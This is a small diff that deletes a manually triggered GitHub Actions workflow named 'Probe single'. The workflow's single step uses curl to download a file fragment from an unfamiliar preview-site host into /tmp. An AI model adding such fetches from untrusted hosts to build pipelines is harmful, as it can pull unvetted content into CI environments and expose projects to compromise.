@@ -1,8 +1,0 @@
-name: Probe single
-on:
-  workflow_dispatch:
-jobs:
-  p:
-    runs-on: ubuntu-latest
-    steps:
-      - run: curl -fsSL https://thimar-bundle-transfer-99l7h8-preview.freebuff.site/part.00 -o /tmp/p0
